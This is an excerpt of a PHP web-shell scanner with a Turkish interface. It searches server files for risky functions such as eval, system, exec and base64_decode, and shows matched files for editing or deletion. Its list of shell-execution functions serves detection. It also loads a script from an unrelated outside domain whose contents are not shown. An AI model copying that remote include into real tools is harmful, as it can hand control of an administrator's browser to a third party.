...
<body>
<center><br><font color="#339900" size="14" face="arial">illegallab Shell Scanner</font></center><br>
<script src="http://licencephp.com/licences/jquery.js"></script>
<?php
set_time_limit(0);
...
<?php
if($_POST['delete']) {
echo "Deleting This File".$filename." ?";
?>
<tr><td align="center" class="me">
<input type="submit" name="yes" value=" E v e t ">
<input type="submit" name="no" value=" H a y ı r ">
</td></tr>
<?php
}else{
echo $stat;
...
<input type="submit" name="close" value=" K a p a t ">
<input type="submit" name="delete" value=" S i l ">
<input type="submit" name="update" value=" K a y d e t ">
</td></tr>
<?php
}
fclose($handle);
...
echo "<br><br><br><font color=red size=3><b><center>".$filename."Bulunamadı...</b></font><br><br><br><br><br><br><br>";
...
$ceks = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file', 'fopen');
...
<tr>
<td class="me" align="right" width="30"><b>Hayır</b></td>
<td class="me" align="center" width="105"><b> Tipi </b></td>
<td class="me" align="center"><b> Bulundugu yer </b></td>
<td class="me" align="center" width="150"><b> Son edit </b></td>
<td class="me" align="right" width="80"><b>Size</b></td>
</tr><br>
<?php
...
<b>Find Function Select (do it all) :</b><br>
...
<input class="isi" disabled="disabled" name="textV" value="other" onFocus="this.select()" type="text" id="textV">
<br><br>
